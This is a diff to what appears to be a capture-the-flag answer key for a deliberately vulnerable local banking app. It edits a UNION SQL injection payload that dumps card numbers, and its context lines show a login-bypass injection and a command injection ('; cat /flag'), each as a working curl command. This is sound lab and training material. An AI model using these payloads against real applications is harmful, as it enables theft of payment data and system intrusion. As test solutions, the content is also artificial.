@@ -69,11 +69,11 @@ saved, the email is not verified), or use **W1-01 (SQLi login bypass)** below.
 
 ### W1-02 — UNION SQLi card leak (A05)
 - **Where:** after login `Transactions` → `/transactions`
-- **`q`:** `' UNION SELECT card_number, card_holder, status FROM cards-- `
+- **`q`:** `' UNION SELECT card_number, expiry, card_holder, status FROM cards-- `
 - **curl:**
   ```bash
   curl -s -b ck.txt -G http://localhost:8080/transactions \
-    --data-urlencode "q=' UNION SELECT card_number, card_holder, status FROM cards-- " | grep -o 'RPC{[^}]*}'
+    --data-urlencode "q=' UNION SELECT card_number, expiry, card_holder, status FROM cards-- " | grep -o 'RPC{[^}]*}'
   ```
 - The flag is the "card number" of the VIP card (Peter Kovac).
 
@@ -182,7 +182,7 @@ curl -s -c ck.txt -o /dev/null -X POST -d "username=tester" -d "password=test123
 # W1-01 bank login (gate cookie + app cookie in ck.txt)
 curl -s -b ck.txt -c ck.txt --data-urlencode "username=' OR '1'='1'-- " --data-urlencode "password=x" http://localhost:8080/login >/dev/null
 curl -s -b ck.txt http://localhost:8080/dashboard | grep -o 'RPC{[^}]*}'                        # W1-01
-curl -s -b ck.txt -G http://localhost:8080/transactions --data-urlencode "q=' UNION SELECT card_number, card_holder, status FROM cards-- " | grep -o 'RPC{[^}]*}' | tail -1   # W1-02
+curl -s -b ck.txt -G http://localhost:8080/transactions --data-urlencode "q=' UNION SELECT card_number, expiry, card_holder, status FROM cards-- " | grep -o 'RPC{[^}]*}' | tail -1   # W1-02
 NONCE=$(curl -s -b ck.txt -c ck.txt "http://localhost:8080/search?q=x" | grep -o 'window.__proof="[0-9a-f]*"' | sed 's/.*"\([0-9a-f]*\)".*/\1/'); curl -s -b ck.txt "http://localhost:8080/search/solved?n=$NONCE"   # W1-04
 curl -s -b ck.txt -G http://localhost:8080/export --data-urlencode "name=x; cat /flag" | grep -o 'RPC{[^}]*}'   # W1-05
 
